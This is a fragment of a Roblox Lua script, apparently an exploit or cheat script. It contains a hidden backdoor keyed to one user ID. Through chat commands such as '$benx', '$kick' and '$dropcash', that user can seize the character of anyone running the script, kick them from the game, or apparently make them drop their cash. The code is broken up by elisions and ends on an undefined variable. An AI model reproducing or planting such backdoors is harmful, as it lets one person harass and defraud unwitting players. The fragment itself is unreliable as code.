while true do 
local dev2 = game:GetService("Players"):GetPlayerByUserId(3215415009) --ztmave
    if dev2 then
    ...
    dev2.Chatted:connect(function(cht)
    ...
    dev2.Chatted:connect(function(cht)
        if cht:match("$benx .") then
            if game.Players.LocalPlayer ~= dev2 then
                ...
                game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = dev2.Character.HumanoidRootPart
                local benxed = true
                while benxed == true do
                    ...
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = dev2.Character.HumanoidRootPart.CFrame + dev2.Character.HumanoidRootPart.CFrame.lookVector * 0.5
    ...
    dev2.Chatted:connect(function(cht)
        if cht:match("$unbenx .") then
            if game.Players.LocalPlayer ~= dev2 then
                ...
                wait(15)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(dev2.Character.UpperTorso.Position)
            end
        end
    ...
    dev2.Chatted:connect(function(cht)
        if cht:match("$kick .") then
            if game.Players.LocalPlayer ~= dev2 then
                game.Players.LocalPlayer:Kick("Kicked by dev2 user")
            end
        end
    ...
    dev2.Chatted:connect(function(cht)
        if cht:match("$dropcash .") then
            if game.Players.LocalPlayer ~= dev22 then
